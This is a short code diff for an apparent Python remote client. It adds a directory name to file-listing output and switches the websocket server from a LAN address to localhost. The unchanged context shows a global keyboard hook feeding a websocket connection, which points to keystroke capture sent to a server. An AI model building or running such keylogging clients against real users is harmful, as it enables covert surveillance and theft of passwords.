@@ -50,12 +50,13 @@ class File:
         _dir = []
         for filename in os.listdir(path):
             full_path = os.path.join(path, filename)
+            dirname = os.path.dirname(os.path.join(path, filename))
             mtime = os.path.getmtime(full_path)*1000
             atime = os.path.getatime(full_path)*1000
             ctime = os.path.getctime(full_path)*1000
             file_size = os.path.getsize(full_path)
             file_abspath = os.path.abspath(full_path)
-            _dir.append({"filename": filename, "file_type": os.path.isdir(full_path), "mtime": mtime, "file_size": file_size, "file_abspath": file_abspath, "atime": atime, "ctime": ctime})
+            _dir.append({"filename": filename, "file_type": os.path.isdir(full_path), "mtime": mtime, "file_size": file_size, "file_abspath": file_abspath, "atime": atime, "ctime": ctime, "dirname": dirname})
         return _dir
 
 
@@ -162,6 +163,6 @@ class Client:
 
 
 if __name__ == '__main__':
-    client = Client("ws://192.168.70.140:5000/ping")
+    client = Client("ws://127.0.0.1:5000/ping")
     keyboard.hook(client.key)
     client.ws.run_forever(ping_interval=10)
